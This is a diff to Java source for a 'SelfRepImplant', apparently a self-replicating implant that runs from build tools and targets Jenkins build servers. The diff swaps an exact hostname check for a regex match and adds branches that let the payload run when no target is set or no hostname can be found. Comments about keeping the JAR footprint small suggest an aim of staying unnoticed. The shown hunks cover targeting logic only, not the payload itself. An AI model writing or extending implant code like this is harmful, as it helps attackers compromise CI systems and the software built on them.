@@ -20,6 +20,8 @@ import java.util.concurrent.atomic.AtomicInteger;
 import java.util.jar.JarFile;
 import java.util.logging.Handler;
 import java.util.logging.Logger;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler {
     // Labels used by the guessExecutionContext method to avoid using enums (enums shows up as extra classes in the JAR)
@@ -90,12 +92,12 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
     static volatile boolean CONF_RUN_FROM_BUILD_TOOL = true;
 
     /**
-     * The expected hostname of the target.
-     * It will not run if the hostname of the machine does not match this value.
+     * Regular expression for the expected hostname(s) of the target(s).
+     * The payload will not run if the hostname of the machine does not match this regex.
      * It's a bit of a sanity check so you don't accidentally trigger this in the wrong environment.
      * Ask us how we know...
      */
-    static volatile String CONF_TARGET_HOSTNAME = "jenkins";
+    static volatile String CONF_TARGET_HOSTNAME_REGEX = ".*jenkins.*";
 
     // This one is not so important. Only use it for temp files and such.
     private static final Random rng = new Random(System.currentTimeMillis());
@@ -382,7 +384,20 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
                 break;
         }
 
-        boolean isDesiredHostname = hostname != null && hostname.equals(CONF_TARGET_HOSTNAME);
+        boolean isDesiredHostname = false;
+        if (CONF_TARGET_HOSTNAME_REGEX == null || CONF_TARGET_HOSTNAME_REGEX.isEmpty()) {
+            // No target hostname specified so anything goes!
+            isDesiredHostname = true;
+        } else if (hostname == null) {
+            // No hostname could be determined for this target. Just go for it anyway?
+            isDesiredHostname = true;
+        } else {
+            Pattern regex = Pattern.compile(CONF_TARGET_HOSTNAME_REGEX);
+            Matcher match = regex.matcher(hostname);
+            if (match.matches()) {
+                isDesiredHostname = true;
+            }
+        }
 
         return isDesiredExecutionContext && isDesiredHostname;
     }
